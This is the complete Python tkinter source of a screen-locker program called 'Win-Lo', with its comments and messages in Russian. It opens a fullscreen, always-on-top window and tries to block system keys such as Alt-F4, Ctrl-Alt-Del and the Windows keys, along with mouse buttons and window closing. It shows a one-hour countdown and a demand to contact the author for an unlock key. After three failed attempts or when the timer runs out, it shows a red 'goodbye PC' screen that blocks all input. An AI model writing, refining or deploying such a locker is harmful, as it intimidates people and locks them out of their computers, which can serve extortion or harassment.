import tkinter as tk
from tkinter import messagebox
import time
import sys
import os

class WinLoApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Win-Lo")
        self.root.configure(bg='black')
        self.root.attributes('-fullscreen', True)
        
        # Правильный ключ
        self.CORRECT_KEY = "DHAJJ-KQWNA"
        self.attempts = 3
        self.time_remaining = 3600  # 1 час в секундах
        self.game_active = True
        self.start_time = time.time()
        
        self.setup_ui()
        self.update_timer()
        self.block_system_keys()
        
    def block_system_keys(self):
        # Блокировка всех системных комбинаций (исправленные названия клавиш)
        system_combinations = [
            "<Alt-F4>", "<Alt-Tab>", "<Control-Escape>", "<Escape>",
            "<Control-Alt-Delete>", "<Control-Shift-Escape>",
            "<Alt-Space>", "<Control-Alt-Down>", "<Control-Alt-Up>",
            "<Control-Alt-Left>", "<Control-Alt-Right>", "<Control-Alt-End>",
            "<Control-w>", "<Control-q>", "<Control-n>", "<Control-t>",
            "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", 
            "<F9>", "<F10>", "<F11>", "<F12>"
        ]
        
        for combo in system_combinations:
            self.root.bind(combo, self.do_nothing)
        
        # Блокировка кнопок Windows (Win/LWin/RWin)
        self.root.bind("<KeyPress-LWin>", self.do_nothing)
        self.root.bind("<KeyPress-RWin>", self.do_nothing)
        self.root.bind("<KeyRelease-LWin>", self.do_nothing)
        self.root.bind("<KeyRelease-RWin>", self.do_nothing)
        
        # Блокировка правой кнопки мыши
        self.root.bind("<Button-3>", self.do_nothing)
        self.root.bind("<Button-2>", self.do_nothing)
        
        # Блокировка закрытия окна
        self.root.protocol("WM_DELETE_WINDOW", self.do_nothing)
        self.root.wm_attributes("-topmost", 1)  # Всегда поверх других окон
        
    def do_nothing(self, event=None):
        # Блокируем все системные комбинации
        return "break"
    
    def setup_ui(self):
        # Таймер сверху
        self.timer_label = tk.Label(
            self.root, 
            text="01:00:00", 
            font=("Arial", 48), 
            fg="red", 
            bg="black"
        )
        self.timer_label.pack(pady=50)
        
        # Основной текст посередине
        message = "Привет мой друг! Это Win-Lo, что бы удалить его, введи ключ! Что бы узнать ключ пиши мне, у тебя 3 попытки на ввод ключа! Исчерпнул попытки пока пк, Удачи."
        
        self.message_label = tk.Label(
            self.root, 
            text=message, 
            font=("Arial", 16), 
            fg="red", 
            bg="black",
            wraplength=700,
            justify="center"
        )
        self.message_label.pack(pady=50)
        
        # Поле для ввода ключа
        input_frame = tk.Frame(self.root, bg='black')
        input_frame.pack(pady=20)
        
        self.key_entry = tk.Entry(
            input_frame, 
            font=("Arial", 18), 
            width=25,
            justify="center"
        )
        self.key_entry.pack(pady=10)
        self.key_entry.bind("<Return>", self.check_key)
        self.key_entry.focus_set()
        
        # Кнопка проверки
        self.check_button = tk.Button(
            input_frame,
            text="Проверить ключ",
            font=("Arial", 14),
            command=self.check_key,
            fg="white",
            bg="darkred"
        )
        self.check_button.pack(pady=10)
        
        # Надпись Win-Lo снизу
        self.winlo_label = tk.Label(
            self.root, 
            text="Win-Lo", 
            font=("Arial", 72), 
            fg="red", 
            bg="black"
        )
        self.winlo_label.pack(side="bottom", pady=50)
        
        # Отображение попыток
        self.attempts_label = tk.Label(
            self.root,
            text=f"Попыток осталось: {self.attempts}",
            font=("Arial", 14),
            fg="red",
            bg="black"
        )
        self.attempts_label.place(x=20, y=20)
    
    def update_timer(self):
        if not self.game_active:
            return
            
        elapsed = time.time() - self.start_time
        remaining = max(0, self.time_remaining - elapsed)
        
        if remaining <= 0:
            self.show_red_screen()
            return
            
        hours = int(remaining // 3600)
        minutes = int((remaining % 3600) // 60)
        seconds = int(remaining % 60)
        
        timer_text = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        self.timer_label.config(text=timer_text)
        
        self.root.after(1000, self.update_timer)
    
    def check_key(self, event=None):
        if not self.game_active:
            return
        
        entered_key = self.key_entry.get().upper().strip()
        self.key_entry.delete(0, tk.END)
        
        if entered_key == self.CORRECT_KEY:
            self.game_active = False
            messagebox.showinfo("Успех", "Правильный ключ! Программа будет закрыта.")
            self.root.after(1000, self.safe_exit)  # Даем время для messagebox
            return
        
        self.attempts -= 1
        self.attempts_label.config(text=f"Попыток осталось: {self.attempts}")
        
        if self.attempts <= 0:
            self.show_red_screen()
        else:
            messagebox.showerror("Ошибка", f"Неверный ключ! Осталось попыток: {self.attempts}")
    
    def safe_exit(self):
        """Безопасный выход из приложения"""
        self.root.quit()
        self.root.destroy()
        try:
            sys.exit(0)
        except:
            os._exit(0)
    
    def show_red_screen(self):
        self.game_active = False
        
        for widget in self.root.winfo_children():
            widget.destroy()
        
        self.root.configure(bg='red')
        
        goodbye_label = tk.Label(
            self.root, 
            text="ПОКА ПК", 
            font=("Arial", 72), 
            fg="black", 
            bg="red"
        )
        goodbye_label.place(relx=0.5, rely=0.5, anchor="center")
        
        # Усиленная блокировка на красном экране
        self.root.bind("<Key>", self.do_nothing)
        self.root.bind("<Button>", self.do_nothing)
        self.root.wm_attributes("-topmost", 1)

# Запуск приложения
if __name__ == "__main__":
    root = tk.Tk()
    app = WinLoApp(root)
    root.mainloop()
